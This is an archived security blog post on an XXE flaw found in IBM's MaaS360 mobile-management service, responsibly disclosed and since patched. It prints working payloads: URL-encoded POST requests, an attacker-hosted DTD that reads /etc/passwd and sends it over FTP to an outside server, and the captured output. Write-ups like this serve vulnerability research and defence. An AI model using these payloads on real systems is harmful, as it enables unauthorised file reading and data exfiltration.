---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-10-16_xxe-in-ibms-maas360-platform.md
original_filename: 2018-10-16_xxe-in-ibms-maas360-platform.md
title: XXE in IBM’s MaaS360 Platform
category: documents
detected_topics:
- sso
- command-injection
- mfa
- api-security
- cloud-security
- mobile-security
tags:
- imported
- documents
- sso
- command-injection
- mfa
- api-security
- cloud-security
- mobile-security
language: en
raw_sha256: 8d810e34d148cdd70408ae81044bae1fdde202d606d5ae643a7016c0be7c41b6
text_sha256: f00dbb8b6268b80ed01f55d557364c52003d0d4d7b7758e28e5f917e044d938c
ingested_at: '2026-06-28T07:31:58Z'
sensitivity: unknown
redactions_applied: false
---

# XXE in IBM’s MaaS360 Platform

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-10-16_xxe-in-ibms-maas360-platform.md
- Source Type: markdown
- Detected Topics: sso, command-injection, mfa, api-security, cloud-security, mobile-security
- Ingested At: 2026-06-28T07:31:58Z
- Redactions Applied: False
- Raw SHA256: `8d810e34d148cdd70408ae81044bae1fdde202d606d5ae643a7016c0be7c41b6`
- Text SHA256: `f00dbb8b6268b80ed01f55d557364c52003d0d4d7b7758e28e5f917e044d938c`


## Content

---
title: "XXE in IBM’s MaaS360 Platform"
page_title: "XXE in IBM's MaaS360 Platform"
url: "https://blog.netspi.com/xxe-in-ibms-maas360-platform/"
final_url: "https://www.netspi.com/blog/technical-blog/web-application-pentesting/xxe-in-ibms-maas360-platform/"
authors: ["Cody Wass"]
programs: ["IBM"]
bugs: ["XXE"]
publication_date: "2018-10-16"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5641
---

[Technical](/blog/technical-blog/#post-container) / Web Application Pentesting 

# XXE in IBM's MaaS360 Platform

October 16, 2018

### [Cody Wass](/authors/cwass/)

  * [](https://www.facebook.com/sharer/sharer.php?u=https://www.netspi.com/blog/technical-blog/web-application-pentesting/xxe-in-ibms-maas360-platform/)
  * [](https://twitter.com/intent/tweet?text=XXE in IBM's MaaS360 Platform&url=https://www.netspi.com/blog/technical-blog/web-application-pentesting/xxe-in-ibms-maas360-platform/)
  * [](https://www.linkedin.com/shareArticle?mini=true&url=https://www.netspi.com/blog/technical-blog/web-application-pentesting/xxe-in-ibms-maas360-platform/&title=XXE in IBM's MaaS360 Platform)

![XXE in IBM's MaaS360 Platform](https://www.netspi.com/wp-content/uploads/2024/03/Blog-Feature-Images-07.webp)

A couple of months ago I had the opportunity to test an implementation of MaaS360 – IBM’s MDM solution. The test was focused on device controls and the protection of corporate data, all things which the client had configured and none of which will be talked about here. Instead, during the course of the test I stumbled upon an External XML Entity (XXE) vulnerability in one of the services used to deliver MaaS360 functionality to IBM clients. Details of the issue and its discovery are the focus of this blog.

### XXE?

First, a lightning fast breakdown of eXtensible Markup Language (XML) and XXE:

XML is a flexible markup language capable of defining instructions for processing itself in a special section called the Document Type Definition (DTD). Within the DTD, ‘XML entities’ can be defined that tell the XML processor to replace certain pieces of text within the document with other values during parsing. As you’ll see below, if you can define a DTD as part of the XML payload that you provide to a service, you can potentially change the way the parser interprets the document.

XXE is a vulnerability in which an XML parser evaluates attacker-defined external XML entities. Traditional (non-external) XML entities are special sequences in an XML document that tell the parser the entire ‘entity’ should be replaced with some other text during document parsing. This can be used to allow characters that would otherwise be interpreted as XML meta-characters to be represented in the document, or to re-use common text in many places while only having to update a single location. Common XML entities supported by all parsers include ‘&gt;’ and ‘&lt;’ – during processing, these entities are replaced with the strings ‘>’ and ‘<‘, respectively. To define a regular, non-external entity, in the DTD you include the following:
  
  
  <!ENTITY regular_entity "I am replacement text">

Within the XML document, then, if you had the string:
  
  
  <dataTag>This is an entity: &regular_entity;</dataTag>

That string during processing would be changed to:
  
  
  <dataTag>This is an entity: I am replacement text</dataTag>

External XML entities behave similarly, but their replacement values aren’t limited to text. With an external XML entity, you can provide a URL that defines an **external** resource that contains the text you want to be inserted. In this case, ‘external’ refers to the fact that the resource isn’t included within the document itself, and means the parser will have to access a separate resource in order to resolve the entity. To differentiate between a regular entity (whose replacement text is contained within the document) and an external entity (whose text is **external** to the document), the keywords ‘SYSTEM’ or ‘PUBLIC’ are included as part of the entity definition. To define an external entity in the DTD, you include the following:
  
  
  <!ENTITY external_entity SYSTEM 'file:///etc/passwd'>

Within the XML document, any instance of the entity will be replaced. For example:
  
  
  <dataTag>This is the password file: &external_entity;</dataTag>

will be transformed into:
  
  
  <dataTag>This is the password file: root:x:0:0:root:/root:/bin/bash [...]</dataTag>

As you can see, if you can trick a parser into evaluating arbitrary external XML entities, you can gain access to the local filesystem.

### The Issue

With the basics out of the way, let’s take a look at functionality in IBM’s MaaS360 that was vulnerable to this type of issue. API functionality wasn’t an area of focus during this test, however, there were a couple places where configuration information was pulled down from MaaS360 servers – I decided to take a quick peek into these to see if I could trick the mobile client into configuring itself improperly. That lead nowhere, but I did identify a handful of requests that were submitting XML payloads in POST requests.

Every request I looked at was being properly parsed and validated. Inline DTDs I added were being ignored and malformed XML documents were being properly rejected – every request with an XML payload seemed to be subject to the same validation standards. Oh well, it was a longshot.

And then, the last request I looked at had this:
  
  
  POST /ios-mdm/ios-mdm-action.htm HTTP/1.1
  Host: services.m3.maas360.com
  Content-Type: application/x-www-form-urlencoded
  Connection: close
  Accept: */*
  User-Agent: [REDACTED]
  Accept-Language: en-us
  Accept-Encoding: gzip, deflate
  Content-Length: 392
  
  RP_REQUEST_TYPE=ACTIONS_RESPONSE_REQUEST&RP_CSN=[REDACTED]&RP_SEC_KEY=[REDACTED]&RP_DATA=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3CActionResults%3E%3CActionResult%20ID%3D%22%22%20type%3D%2213%22%3E%3Cparam%20name%3D%22status%22%3ESuccess%3C%2Fparam%3E%3C%2FActionResult%3E%3C%2FActionResults%3E%0A&RP_BILLING_ID=[REDACTED]&RP_PLATFORM_ID=[REDACTED]&RP_REQUEST_VERSION=[REDACTED]

Hmm. An XML payload, but URL-encoded and passed as the value of a x-www-form-urlencoded parameter. That’s interesting. They probably have to parse this differently than they parse their XML-only payloads. What if I…
  
  
  POST /ios-mdm/ios-mdm-action.htm HTTP/1.1
  Host: services.m3.maas360.com
  Content-Type: application/x-www-form-urlencoded
  Connection: close
  Accept: */*
  User-Agent: [REDACTED]
  Accept-Language: en-us
  Accept-Encoding: gzip, deflate
  Content-Length: 468
  
  RP_REQUEST_TYPE=ACTIONS_RESPONSE_REQUEST&RP_CSN=[REDACTED]&RP_SEC_KEY=[REDACTED]&RP_DATA=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3CDOCTYPE+foo+SYSTEM+'https://6mtgnrnugo50ggqjccizibkrui09oy.netspi-collaborator.com'%3E%3CActionResults%3E%3CActionResult%20ID%3D%22%22%20type%3D%2213%22%3E%3Cparam%20name%3D%22status%22%3ESuccess%3C%2Fparam%3E%3C%2FActionResult%3E%3C%2FActionResults%3E%0A&RP_BILLING_ID=[REDACTED]

Note the above URL-encoded external entity that references https://6mtgnrnugo50ggqjccizibkrui09oy.netspi-collaborator.com – this is a Burp Collaborator URL. There was a delay, and then the application responded with a blank ‘HTTP 200’. Looking over at my Collaborator instance showed:

![Collab](https://www.netspi.com/wp-content/uploads/2018/10/collab1-2.png)

A DNS query, then an HTTP request to retrieve the resource I had injected! Not only did I have XXE, I also had unrestricted outbound access to help with exfiltration. The outbound access was key, in this case – as mentioned previously, the HTTP response to successful XXE processing was an ‘HTTP 200’ with an empty body, which is worthless for data exfiltration.

To take advantage of the unrestricted outbound access, I injected a DTD that referenced an _additional_ DTD hosted on a server I controlled. This allowed me to define parameter entities that would be evaluated during the parsing of the XML document without requiring me to modify the existing (valid) document structure.
  
  
  POST /ios-mdm/ios-mdm-action.htm HTTP/1.1
  Host: services.m3.maas360.com
  Content-Type: application/x-www-form-urlencoded
  Connection: close
  Accept: */*
  User-Agent: MaaS360-MaaS360-iOS/3.50.83
  Accept-Language: en-us
  Accept-Encoding: gzip, deflate
  Content-Length: 452
  
  RP_REQUEST_TYPE=ACTIONS_RESPONSE_REQUEST&RP_CSN=[REDACTED]&RP_SEC_KEY=[REDACTED]&RP_DATA=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3C!DOCTYPE+foo+SYSTEM+'https://192.0.2.1/xxe.dtd'%3E%3CActionResults%3E%3CActionResult%20ID%3D%22%22%20type%3D%2213%22%3E%3Cparam%20name%3D%22status%22%3ESuccess%3C%2Fparam%3E%3C%2FActionResult%3E%3C%2FActionResults%3E%0A&RP_BILLING_ID=[REDACTED]&RP_PLATFORM_ID=3&RP_REQUEST_VERSION=1.0

In the request above, ‘https://192.0.2.1/xxe.dtd’ is a reference to the below DTD, hosted on a server I controlled:
  
  
  <!ENTITY % all SYSTEM "file:///etc/passwd">
  <!ENTITY % param1 "<!ENTITY % external SYSTEM 'ftp://192.0.2.1:443/%all;'>">%param1;%external;

To go through the parsing step-by-step:

1\. POST request (with inline DTD referencing an external DTD) submitted to server  
2\. Server receives XML payload and starts parsing inline Document Type Definition (DTD)  
3\. Inline DTD references an external DTD, so the server retrieves the external DTD to continue parsing  
4\. Parsing the external DTD results in the creation of multiple parameter entities that contain our exfiltration payload and exfiltration endpoint  
5\. The final parsing of the (internal + external) DTD results in the FTP connection to the exfiltration server, which contains our exfiltrated data as part of the URL  
6\. As long as we have a ‘fake’ FTP service listening on our FTP server, we should be able to catch the exfiltrated data sent in step #5

The result of using the above to read the file ‘/etc/passwd’ is shown below:
  
  
  root@pentest:~/# ruby server.rb
  New client connected
  USER anonymous
  PASS Java1.8.0_161@
  TYPE I
  /root:x:0:0:root:
  /root:
  /bin
  QUIT

You’ll notice that’s the first line of a typical /etc/passwd file, albeit split across multiple lines. Since I was clearly able to exfiltrate data, it was time to stop verifying the issue and notify IBM of the finding.

### Conclusion

Some key takeaways from this:

1\. XML is a dangerous data format that’s easy to handle incorrectly. If you see it, get excited.  
2\. If you’re looking into something and you feel like every parameter you test isn’t vulnerable, _keep checking_ – it was the last request I checked that was vulnerable.

### Disclosure Timeline

May 11, 2018: Vulnerability discovered, details sent to IBM  
May 11, 2018: Response from IBM acknowledging report and containing advisory number for tracking  
May 18, 2018: Email and response from IBM regarding status  
June 8, 2018: Email regarding status. IBM response indicates issue confirmed and fix almost complete  
June 22, 2018: Email regarding status. IBM response indicates issue was patched June 9, 2018  
July 18-20, 2018: Email regarding blog release. IBM responds that blog is fine, indicates PSIRT acknowledgment page has been updated  
October 2018: Blog published

## Explore More Blog Posts

[ ![](https://www.netspi.com/wp-content/uploads/2024/07/072924_TECH_GCPwn_Feature.webp) Cloud Pentesting Bypassing Microsoft Entra Conditional Access Policies via Nested App Authentication  June 22, 2026 Discover how attackers bypassed Microsoft Entra Conditional Access Policies using Nested App Authentication (NAA) flows in this technical vulnerability breakdown. Learn More ](https://www.netspi.com/blog/technical-blog/cloud-pentesting/bypassing-microsoft-entra-conditional-access-policies-via-nested-app-authentication/)[ ![](https://www.netspi.com/wp-content/uploads/2026/06/Feature-Image_Red-Plaid.jpg) Social Engineering I’m Just Asking Questions: Social Engineering as a Reporter  June 17, 2026 Dive into this real-world social engineering assessment where a fake anonymous tip and an adversary-in-the-middle framework tested the limits of an organization's security policies. Learn More ](https://www.netspi.com/blog/technical-blog/social-engineering/im-just-asking-questions-social-engineering-as-a-reporter/)[ ![](https://www.netspi.com/wp-content/uploads/2025/12/TB-Design-6_Feature-Image.png) CISO Perspectives Beyond the Hype: What Regulated Industries Need to Know Before Trusting AI Security Tooling  June 16, 2026 AI security tools can build an attack, but enterprise security teams in regulated industries need consistency, auditability, and predictable costs before they can trust one. Learn why the surrounding infrastructure is where most AI security vendors are still falling short. Learn More ](https://www.netspi.com/blog/executive-blog/ciso-perspectives/beyond-the-hype-what-regulated-industries-need-to-know-before-trusting-ai-security-tooling/)
